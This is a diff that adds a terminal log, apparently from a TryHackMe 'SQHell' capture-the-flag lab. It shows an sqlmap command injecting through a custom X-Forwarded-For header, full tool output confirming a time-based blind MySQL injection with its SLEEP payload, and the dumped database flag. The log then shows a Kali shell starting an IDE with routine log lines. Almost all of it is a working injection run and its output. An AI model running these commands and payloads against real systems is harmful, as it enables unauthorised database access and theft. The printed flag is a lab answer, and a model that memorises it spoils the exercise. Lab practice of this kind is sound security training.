@@ -1,0 +1,101 @@
+sqlmap -u "http://10.48.174.0/terms-and-conditions" \
+       --dbms=mysql \       
+       --headers="X-Forwarded-For: 10.80.180.84*" \
+       --dump -T flag -C flag
+        ___
+       __H__                                                                                                                                                                                                    
+ ___ ___[)]_____ ___ ___  {1.10.6#stable}                                                                                                                                                                       
+|_ -| . [.]     | .'| . |                                                                                                                                                                                       
+|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                                       
+      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                    
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 09:57:40 /2026-07-06/
+
+[09:57:40] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+do you want to try URI injections in the target URL itself? [Y/n/q] Y
+[09:57:43] [INFO] testing connection to the target URL
+[09:57:43] [INFO] checking if the target is protected by some kind of WAF/IPS
+[09:57:43] [INFO] testing if the target URL content is stable
+[09:57:43] [INFO] target URL content is stable
+[09:57:43] [INFO] testing if (custom) HEADER parameter 'X-Forwarded-For #1*' is dynamic
+[09:57:43] [WARNING] (custom) HEADER parameter 'X-Forwarded-For #1*' does not appear to be dynamic
+[09:57:43] [WARNING] heuristic (basic) test shows that (custom) HEADER parameter 'X-Forwarded-For #1*' might not be injectable
+[09:57:43] [INFO] testing for SQL injection on (custom) HEADER parameter 'X-Forwarded-For #1*'
+[09:57:43] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[09:57:44] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[09:57:44] [INFO] testing 'Generic inline queries'
+[09:57:44] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[09:57:44] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[09:57:44] [WARNING] time-based comparison requires larger statistical model, please wait............... (done)                                                                                                
+[09:57:55] [INFO] (custom) HEADER parameter 'X-Forwarded-For #1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[09:58:13] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[09:58:13] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[09:58:14] [INFO] checking if the injection point on (custom) HEADER parameter 'X-Forwarded-For #1*' is a false positive
+(custom) HEADER parameter 'X-Forwarded-For #1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] Y
+[09:58:48] [INFO] testing if URI parameter '#1*' is dynamic
+[09:58:48] [WARNING] URI parameter '#1*' does not appear to be dynamic
+[09:58:48] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
+[09:58:48] [INFO] testing for SQL injection on URI parameter '#1*'
+[09:58:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[09:58:49] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[09:58:49] [INFO] testing 'Generic inline queries'
+[09:58:49] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[09:58:49] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] y
+[09:58:52] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[09:58:52] [WARNING] URI parameter '#1*' does not seem to be injectable
+sqlmap identified the following injection point(s) with a total of 93 HTTP(s) requests:
+---
+Parameter: X-Forwarded-For #1* ((custom) HEADER)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: 10.80.180.84' AND (SELECT 4817 FROM (SELECT(SLEEP(5)))MxeV) AND 'DrFH'='DrFH
+---
+[09:58:52] [INFO] the back-end DBMS is MySQL
+[09:58:52] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL >= 5.0.12
+[09:58:53] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[09:58:53] [INFO] fetching current database
+[09:58:53] [INFO] retrieved: 
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
+[09:59:13] [INFO] adjusting time delay to 1 second due to good response times
+sqhell_1
+[09:59:41] [INFO] fetching entries of column(s) 'flag' for table 'flag' in database 'sqhell_1'
+[09:59:41] [INFO] fetching number of column(s) 'flag' entries for table 'flag' in database 'sqhell_1'
+[09:59:41] [INFO] retrieved: 1
+[09:59:44] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                                                                        
+THM{FLAG2:C678ABFE1C01FCA19E03901CEDAB1D15}
+Database: sqhell_1
+Table: flag
+[1 entry]
++---------------------------------------------+
+| flag                                        |
++---------------------------------------------+
+| THM{FLAG2:C678ABFE1C01FCA19E03901CEDAB1D15} |
++---------------------------------------------+
+
+[10:02:19] [INFO] table 'sqhell_1.flag' dumped to CSV file '/home/sonar/.local/share/sqlmap/output/10.48.174.0/dump/sqhell_1/flag.csv'
+[10:02:19] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 31 times
+[10:02:19] [INFO] fetched data logged to text files under '/home/sonar/.local/share/sqlmap/output/10.48.174.0'
+
+[*] ending @ 10:02:19 /2026-07-06/
+
+                                                                                                                                                                                                                
+┌──(sonar㉿Kali)-[~/…/Files/AI_in_cyb/tryhackme/SQHell]
+└─$ antigravity
+[main 2026-07-06T04:34:12.275Z] [BrowserOnboardingClientMainService] Starting browser onboarding server
+[main 2026-07-06T04:34:12.279Z] [BrowserOnboardingClientServer] Browser onboarding server started on http://localhost:43633
+[main 2026-07-06T04:34:12.366Z] update#setState idle
+[main 2026-07-06T04:34:42.367Z] update#setState checking for updates
+[main 2026-07-06T04:34:42.647Z] update#setState available for download
+[main 2026-07-06T04:38:59.355Z] Extension host with pid 163770 exited with code: 0, signal: unknown.
+Failed to flush on shutdown: Error: Flush timeout
+    at Timeout._onTimeout (file:///opt/antigravity-ide/resources/app/out/main.js:4474:69735)
+    at listOnTimeout (node:internal/timers:588:17)
+    at process.processTimers (node:internal/timers:523:7)
